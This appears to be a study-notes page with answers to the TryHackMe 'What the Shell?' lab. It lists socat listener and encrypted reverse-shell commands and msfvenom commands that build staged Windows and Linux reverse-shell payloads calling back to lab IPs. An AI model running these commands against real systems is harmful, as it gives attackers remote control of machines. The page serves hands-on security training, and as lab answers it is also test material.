---
description: https://tryhackme.com/room/introtoshells
---

# What the Shell?

{% embed url="https://tryhackme.com/room/introtoshells" %}

## Task 6 Socat

#### How would we get socat to listen on TCP port 8080?

{% hint style="success" %}
`TCP-L:8080`
{% endhint %}

## Task 7 Socat Encrypted Shells

#### What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem"

{% hint style="success" %}
`socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:tty,raw,echo=0`
{% endhint %}

#### If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?

{% hint style="success" %}
`socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`
{% endhint %}

## Task 9 msfvnom

#### Generate a staged reverse shell for a 64 bit Windows target, in a `.exe` format using your TryHackMe tun0 IP address and a chosen port.

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.6.9.176 \
         -a x64 --platform windows -f exe -o shell.exe
```

![](<../../.gitbook/assets/Screenshot from 2022-04-15 06-30-17.png>)

#### Which symbol is used to show that a shell is stageless?

{% hint style="success" %}
\_
{% endhint %}

#### What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is `elf` and the output filename should be `shell`

![](<../../.gitbook/assets/Screenshot from 2022-04-15 06-40-57.png>)

{% hint style="success" %}
`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=443 -f elf -o shell`
{% endhint %}

